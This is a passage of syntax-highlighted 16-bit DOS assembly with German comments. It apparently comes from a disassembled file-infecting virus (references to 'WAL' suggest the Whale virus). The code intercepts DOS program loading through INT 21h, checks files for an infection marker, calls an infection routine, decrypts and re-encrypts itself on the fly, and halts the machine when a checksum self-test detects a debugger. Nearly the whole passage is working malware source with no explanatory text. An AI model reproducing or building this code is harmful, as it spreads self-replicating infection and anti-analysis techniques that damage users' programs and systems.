                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">000Eh</span><span class="sc0">                    </span><span class="sc1">; kopiere epb in ds</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EPB</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0050h</span><span class="sc0">                </span><span class="sc1">; kopiere kommandozeile</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Cmd_Line</span><span class="sc0">
                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">               </span><span class="sc1">; wird wieder zerstîrt</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; Original-BP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E6</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; CALLERs IP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; CALLERS CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; CALLERS Flags</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B01h</span><span class="sc0">                </span><span class="sc1">; Load, but do not execute</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Segment EPB</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EPB</span><span class="sc0">           </span><span class="sc1">; Offset EPB</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Low_INT_21H</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">37</span><span class="sc0">

                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J032DA</span><span class="sc0">                  </span><span class="sc1">; JMP if kein Fehler</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],+</span><span class="sc2">01h</span><span class="sc1">; sonst CF setzen</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Flags</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E8</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E6</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; IP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2424</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Alten EPB zurÅck</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">                   </span><span class="sc1">; Alten SP</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">IRET_Int21h</span><span class="sc0">             </span><span class="sc1">; und fertig</span><span class="sc0">
</span><span class="sc1">;======================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc1">;=======================================( kein Fehler aufgetreten )===</span><span class="sc0">
</span><span class="sc5">J032DA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">38</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_Current_PSP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0014h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D2452</span><span class="sc0">
</span><span class="sc5">J032EA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@PSP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASW</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J032FF</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24A2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J032EA</span><span class="sc0">
</span><span class="sc1">;====================================================================</span><span class="sc0">
</span><span class="sc5">J032FF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">38</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2503</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Ist IP-Init = 1 ( WAL ! )</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0334D</span><span class="sc0">                  </span><span class="sc1">; nein. Dann infizieren</span><span class="sc0">
                                                </span><span class="sc1">; sonst wal ausblenden</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">39</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">001Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2505</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0018h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2503</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0012h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2501</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0014h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24FF</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">39</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0345F</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J0334D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03428</span><span class="sc0">          </span><span class="sc1">; jmp zut Infect-routine</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================( Selbst-Test )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03350</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03362</span><span class="sc0">

</span><span class="sc5">J0335B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;-----------------------------------( netterweise werden hier die )---</span><span class="sc0">
</span><span class="sc1">;-----------------------------------( 'echten' Labels publik !    )---</span><span class="sc0">
</span><span class="sc5">J03362</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0021h</span><span class="sc0">        </span><span class="sc1">; 2831..2852 ; ENTRY...2852</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">007Ah</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0173h</span><span class="sc0">        </span><span class="sc1">; 2983..298d ; init SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">000Ah</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0253h</span><span class="sc0">        </span><span class="sc1">; 2a63..2a7f ; trace...</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001Ch</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0550h</span><span class="sc0">        </span><span class="sc1">; 2d60..2d6a ; ?????????????</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">000Ah</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0705h</span><span class="sc0">        </span><span class="sc1">; 2f15..2f55</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0040h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0790h</span><span class="sc0">        </span><span class="sc1">; 2fa0..2ff6</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0056h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0A30h</span><span class="sc0">        </span><span class="sc1">; 3240..3264</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0024h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0C0Ah</span><span class="sc0">        </span><span class="sc1">; 341a..3428</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">000Eh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0CC4h</span><span class="sc0">        </span><span class="sc1">; 34d4..3510</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">003Ch</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">105Ah</span><span class="sc0">        </span><span class="sc1">; 386a..3897</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">002Dh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1106h</span><span class="sc0">        </span><span class="sc1">; 3916..393f</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0029h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">210Ah</span><span class="sc0">        </span><span class="sc1">; 491a..4981</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0067h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">2173h</span><span class="sc0">        </span><span class="sc1">; 4983..4a56</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">00D8h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">236Ch</span><span class="sc0">        </span><span class="sc1">; 4b7c..4bb5</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0039h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1D7Dh</span><span class="sc0">        </span><span class="sc1">; 458d..45b2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0025h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1C7Ch</span><span class="sc0">        </span><span class="sc1">; 448c..44ce</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0042h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0335B</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">                          </span><span class="sc1">; sic !!</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03412</span><span class="sc0">
        </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">],</span><span class="sc2">0F4F4h</span><span class="sc0">     </span><span class="sc1">; = HLT</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D2598</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">     </span><span class="sc1">; SEGMENT Int 01</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Debugger_Check</span><span class="sc0">                 </span><span class="sc1">; STOP</span><span class="sc0">
        </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J03412</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">40</span><span class="sc0">
</span><span class="sc5">J03419</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;====================================================( JMP J034D4 )===</span><span class="sc0">
</span><span class="sc5">J0341A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                              </span><span class="sc1">; BX = 325C</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J034D4</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J0325C</span><span class="sc0">  </span><span class="sc1">; BX = 34D4</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">                         </span><span class="sc1">; BP = SP</span><span class="sc0">
                </span><span class="sc1">;****************************************************</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">36H</span><span class="sc0">             </span><span class="sc1">; Seg-Prefix hat noch gefehlt</span><span class="sc0">
                </span><span class="sc1">;****************************************************</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">              </span><span class="sc1">; -&gt; JMP  DX -&gt; JMP BX</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc2">000</span><span class="sc0">
</span><span class="sc1">;-------------------------------( Nochmal Kontrolle, ob infiziert )---</span><span class="sc0">
</span><span class="sc5">J03428</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">41</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">5348h</span><span class="sc0">   </span><span class="sc1">; 'SH'</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">4649h</span><span class="sc0">   </span><span class="sc1">; 'FI'</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">41</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J034AF</span><span class="sc0">                  </span><span class="sc1">; ist schon infiziert</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Cmd_Line</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J039C3</span><span class="sc0">          </span><span class="sc1">; ist die Datei ausfÅhrbar ?</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J043B1</span><span class="sc0">          </span><span class="sc1">; Vorarbeiten</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EF</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03642</span><span class="sc0">          </span><span class="sc1">; infizieren</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24EF</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================( Datei im RAM wird gestartet )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0345F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                  </span><span class="sc1">; GET current PSP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegisters</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
